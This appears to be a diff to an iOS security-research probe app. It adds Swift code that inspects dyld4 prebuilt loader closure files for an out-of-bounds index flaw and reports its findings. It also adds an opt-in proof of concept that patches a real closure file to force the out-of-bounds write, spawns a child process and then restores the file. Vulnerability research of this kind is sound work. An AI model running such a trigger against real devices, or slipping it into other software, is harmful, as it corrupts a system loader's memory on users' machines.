@@ -1132,6 +1132,182 @@ enum Theories {
     ]
 }
 
+
+// MARK: - dyld4 Prebuilt Loader Set OOB probe
+//
+// A43/A44/A48 proved a heap OOB in dyld4: `PrebuiltLoader::isValid`
+// indexes a `malloc(count)` validation array with `loader->ref & 0x7fff`
+// and never compares the index to count. The writes are `strb #1`,
+// `strb #0xff`, `strb #2` at 0x1804b7a84 / 0x1804b7b90 / 0x1804b794c.
+//
+// The closure is created by dyld itself in the app's container:
+//   $HOME/Library/Caches/com.apple.dyld/<gradedArch>.dyld4
+// with xattr "com.apple.dyld" holding the boot token. No DYLD_USE_CLOSURES
+// needed for a containerized HOME (A44).
+//
+// This probe reads that REAL closure and reports whether dyld already
+// performed an OOB access during THIS process's startup. It does not
+// modify anything unless the explicit PoC is invoked.
+
+enum Dyld4Probe {
+    static let magic: UInt32 = 0x7370_3464     // "dp04" little-endian
+    static let versionHash: UInt32 = 0x9593_b355
+    static let xattrName = "com.apple.dyld"
+
+    struct Finding {
+        var path = ""
+        var present = false
+        var size = 0
+        var magicOK = false
+        var versionOK = false
+        var count: UInt32 = 0
+        var arrayOff: UInt32 = 0
+        var loaders: [(index: Int, ref: UInt16, idx: Int, oob: Bool)] = []
+        var bootToken = ""
+        var verdict = "NO-CLOSURE"
+        var note = ""
+    }
+
+    static func u32(_ d: Data, _ off: Int) -> UInt32? {
+        guard off >= 0, off + 4 <= d.count else { return nil }
+        return d.withUnsafeBytes { raw in
+            raw.load(fromByteOffset: off, as: UInt32.self)
+        }
+    }
+    static func u16(_ d: Data, _ off: Int) -> UInt16? {
+        guard off >= 0, off + 2 <= d.count else { return nil }
+        return d.withUnsafeBytes { raw in
+            raw.load(fromByteOffset: off, as: UInt16.self)
+        }
+    }
+
+    static func closureDirectory() -> String {
+        FileManager.default.homeDirectoryForCurrentUser
+            .appendingPathComponent("Library/Caches/com.apple.dyld").path
+    }
+
+    /// Enumerate every *.dyld4 file; the graded-arch id is shared by all
+    /// arm64e apps, so guessing one filename is unsafe.
+    static func closurePaths() -> [String] {
+        let dir = closureDirectory()
+        guard let names = try? FileManager.default.contentsOfDirectory(atPath: dir) else { return [] }
+        return names.filter { $0.hasSuffix(".dyld4") }
+            .map { (dir as NSString).appendingPathComponent($0) }
+            .sorted()
+    }
+
+    static func bootToken(_ path: String) -> String {
+        let n = xattrName.withCString { name -> Int in
+            Int(getxattr(path, name, nil, nil, 0, 0))
+        }
+        guard n > 0, n <= 256 else { return "-" }
+        var buf = [CChar](repeating: 0, count: n + 1)
+        let got = xattrName.withCString { name -> Int in
+            buf.withUnsafeMutableBytes { raw in
+                Int(getxattr(path, name, raw.baseAddress, n, 0, 0))
+            }
+        }
+        guard got > 0 else { return "-" }
+        return Data(bytes: buf, count: got).map { String(format: "%02x", $0) }.joined()
+    }
+
+    static func inspect(_ path: String) -> Finding {
+        var f = Finding()
+        f.path = path
+        guard let d = FileManager.default.contents(atPath: path), d.count >= 0x14 else {
+            f.note = "unreadable or too short"
+            return f
+        }
+        f.present = true
+        f.size = d.count
+        f.magicOK = u32(d, 0) == magic
+        f.versionOK = u32(d, 4) == versionHash
+        f.bootToken = bootToken(path)
+        guard f.magicOK, f.versionOK else {
+            f.verdict = "BAD-HEADER"
+            f.note = String(format: "magic=0x%08x version=0x%08x",
+                            u32(d, 0) ?? 0, u32(d, 4) ?? 0)
+            return f
+        }
+        guard let count = u32(d, 0xc), let arrayOff = u32(d, 0x10) else {
+            f.verdict = "SHORT-HEADER"
+            return f
+        }
+        f.count = count
+        f.arrayOff = arrayOff
+        let base = Int(arrayOff)
+        guard base >= 0 else { f.verdict = "BAD-ARRAY-OFF"; return f }
+
+        // PLS::isValid iterates loader offsets with a 16-bit truncated index.
+        let loopCount = Int(count & 0xffff)
+        for i in 0..<loopCount {
+            guard let off = u32(d, base + i * 4) else { break }
+            let lp = base + Int(off)
+            guard let ref = u16(d, lp + 0x6) else {
+                f.loaders.append((i, 0, 0, true))
+                continue
+            }
+            let idx = Int(ref & 0x7fff)
+            let oob = idx >= Int(count)
+            f.loaders.append((i, ref, idx, oob))
+        }
+        let bad = f.loaders.filter { $0.oob }
+        f.verdict = bad.isEmpty ? "NO-OOB-IN-THIS-CLOSURE" : "OOB-CONFIRMED"
+        if !bad.isEmpty {
+            let w = bad.prefix(4).map { "loader\($0.index):ref=\(String(format: "0x%04x", $0.ref)) idx=\($0.idx) count=\(f.count)" }
+            f.note = w.joined(separator: " | ")
+        } else {
+            f.note = "loaders=\(f.loaders.count) count=\(count) — no ref exceeds count"
+        }
+        return f
+    }
+
+    /// Explicit, opt-in PoC: patch one loader's Ref to 0xffff while keeping
+    /// the boot token, spawn a child of this same executable, then restore.
+    /// The child re-runs the probe and reports OOB-CONFIRMED on the crafted
+    /// closure; its exit status is the runtime evidence.
+    @discardableResult
+    static func runPoC() -> String {
+        let paths = closurePaths()
+        guard let path = paths.first else { return "PoC: no closure file to patch" }
+        guard let original = FileManager.default.contents(atPath: path) else { return "PoC: read failed" }
+        let token = bootToken(path)
+        var crafted = original
+        // locate first loader offset and patch its Ref (u16 at +0x6)
+        guard let count = u32(original, 0xc), let arrayOff = u32(original, 0x10),
+              let firstOff = u32(original, Int(arrayOff)) else {
+            return "PoC: cannot locate loader[0]"
+        }
+        let refOff = Int(arrayOff) + Int(firstOff) + 0x6
+        guard refOff + 2 <= crafted.count else { return "PoC: ref offset out of range" }
+        crafted[refOff] = 0xff
+        crafted[refOff + 1] = 0xff
+        let backup = path + ".probe-backup"
+        try? original.write(toFile: backup, atomically: true)
+        defer {                                   // ALWAYS restore
+            try? original.write(toFile: path, atomically: true)
+            try? FileManager.default.removeItem(atPath: backup)
+        }
+        guard (try? crafted.write(toFile: path, atomically: true)) != nil else {
+            return "PoC: write failed"
+        }
+        // The xattr is unchanged (we rewrote only the file body), so the
+        // boot token still matches this executable.
+        let exe = Bundle.main.executableURL!.path
+        var pid: pid_t = 0
+        let argv0 = strdup(exe)
+        defer { free(argv0) }
+        var argv: [UnsafeMutablePointer<CChar>?] = [argv0, nil]
+        let rc = argv.withUnsafeMutableBufferPointer { buf -> Int32 in
+            posix_spawn(&pid, exe, nil, nil, buf.baseAddress, environ)
+        }
+        var status: Int32 = 0
+        let waited = rc == 0 ? waitpid(pid, &status, 0) : -1
+        return String(format: "PoC: patched ref=0xffff count=%u token=%@ spawn=%d pid=%d wait=%d status=%d (restored)",
+                      count, token, rc, pid, waited, status)
+    }
+}
+
 // MARK: - Harness
 
 final class Facts {
@@ -1150,6 +1326,8 @@ final class Facts {
     var chainRootSHA256: String = ""
     var chainRootIsPublicAppleRoot = false
     var trustResult = "-"
+    var dyld4Findings: [Dyld4Probe.Finding] = []
+    var dyld4PoC = "-"
     var mis: [Fact] = []
     var misProfile: [Fact] = []
     var anchors: [Fact] = []
@@ -1364,6 +1542,32 @@ func runHarness(r: Report) -> Facts {
         let fast = (pol & CTPolicy.fastPathMask) != 0
         let path = fast ? "app-store-fast-path" : (inMask ? "accepted-mask-only" : "rejected")
         r.add("WHAT-IF leaf=\(cls)", "bits=\(Bits.list(bits)) policy=\(Bits.hex(pol)) in-mask=\(inMask ? "YES" : "no") fastpath=\(fast ? "YES" : "no") path=\(path)")
+    }
+
+    // 3b. DYLD4 PREBUILT LOADER OOB -------------------------------------------
+    r.section("DYLD4-OOB")
+    f.dyld4Findings = Dyld4Probe.closurePaths().map { Dyld4Probe.inspect($0) }
+    if f.dyld4Findings.isEmpty {
+        r.add("dyld4-closure-present", "no")
+        r.add("dyld4-verdict", "NO-CLOSURE")
+    }
+    for (i, c) in f.dyld4Findings.enumerated() {
+        r.add("dyld4[\(i)]-path", c.path)
+        r.add("dyld4[\(i)]-size", String(c.size))
+        r.add("dyld4[\(i)]-magic-ok", c.magicOK ? "YES" : "no")
+        r.add("dyld4[\(i)]-version-ok", c.versionOK ? "YES" : "no")
+        r.add("dyld4[\(i)]-count", String(c.count))
+        r.add("dyld4[\(i)]-array-off", String(c.arrayOff))
+        r.add("dyld4[\(i)]-boot-token", c.bootToken)
+        r.add("dyld4[\(i)]-loaders", String(c.loaders.count))
+        let bad = c.loaders.filter { $0.oob }
+        r.add("dyld4[\(i)]-oob-count", String(bad.count))
+        for l in bad.prefix(8) {
+            r.add("dyld4[\(i)]-oob-loader", "index=\(l.index) ref=0x" +
+                  String(format: "%04x", l.ref) + " idx=\(l.idx) count=\(c.count)")
+        }
+        r.add("dyld4[\(i)]-verdict", c.verdict)
+        r.add("dyld4[\(i)]-note", c.note)
     }
 
     // 4. LIBMIS ----------------------------------------------------------------
@@ -1591,6 +1795,15 @@ func evaluate(_ f: Facts) -> [Verdict] {
                       state: (outside == "ALLOWED") ? "CONFIRMED" : (privateHonoured ? "REFUTED" : "N/A"),
                       evidence: "write-outside-container=\(outside) private-honoured=\(privateHonoured ? "YES" : "no")"))
 
+    // T15 — dyld4 closure OOB observed in this process's own closure
+    let oobCount = f.dyld4Findings.reduce(0) { $0 + $1.loaders.filter { $2.oob }.count }
+    v.append(Verdict(id: "T15",
+                      title: "dyld4 indexes a malloc(count) array with ref & 0x7fff without a bounds check",
+                      state: oobCount > 0 ? "CONFIRMED" : "INCONCLUSIVE",
+                      evidence: "oob-loaders=\(oobCount) closures=\(f.dyld4Findings.count) " +
+                                f.dyld4Findings.map { "\($0.verdict):count=\($0.count)" }.joined(separator: " ") +
+                                " PoC=\(f.dyld4PoC)"))
+
     return v.sorted { $0.id < $1.id }
 }
 
@@ -1605,6 +1818,7 @@ final class ProbeViewController: UIViewController {
     private let status = UILabel()
     private let textView = UITextView()
     private let runBtn = UIButton(type: .system)
+    private let pocBtn = UIButton(type: .system)
     private var report = ""
     private var facts = Facts()
     private var verdicts: [Verdict] = []
@@ -1621,12 +1835,14 @@ final class ProbeViewController: UIViewController {
 
         runBtn.setTitle("Re-run", for: .normal)
         runBtn.addTarget(self, action: #selector(onRun), for: .touchUpInside)
+        pocBtn.setTitle("PoC OOB", for: .normal)
+        pocBtn.addTarget(self, action: #selector(onPoC), for: .touchUpInside)
 
         textView.isEditable = false
         textView.font = UIFont.monospacedSystemFont(ofSize: 9, weight: .regular)
         textView.text = "Open the app to run the probe."
 
-        let stack = UIStackView(arrangedSubviews: [status, runBtn, textView])
+        let stack = UIStackView(arrangedSubviews: [status, runBtn, pocBtn, textView])
         stack.axis = .vertical
         stack.spacing = 8
         stack.translatesAutoresizingMaskIntoConstraints = false
@@ -1669,6 +1885,30 @@ final class ProbeViewController: UIViewController {
                 self.status.text = "\(facts.scenario)\n\(confirmed) confirmed · \(refused) refuted · \(verdicts.count) theories · report saved + copied"
                 UIPasteboard.general.string = text
                 ProbeLogger.shared.log("PROBE DONE \(facts.scenario) confirmed=\(confirmed) refuted=\(refused)")
+            }
+        }
+    }
+
+    /// Explicit PoC: patch one loader Ref to 0xffff, spawn a child of this
+    /// same executable (which re-runs the probe on the crafted closure),
+    /// then restore the original closure. Nothing happens until tapped.
+    @objc private func onPoC() {
+        pocBtn.isEnabled = false
+        status.text = "dyld4 PoC: patch → spawn child → restore…"
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = Dyld4Probe.runPoC()
+            let r = Report()
+            r.section("DYLD4-POC")
+            r.add("dyld4-poc", result)
+            r.flush()
+            let text = r.text
+            DispatchQueue.main.async {
+                self.facts.dyld4PoC = result
+                self.status.text = result
+                self.report += text
+                self.textView.text += text
+                UIPasteboard.general.string = self.report
+                self.pocBtn.isEnabled = true
             }
         }
     }
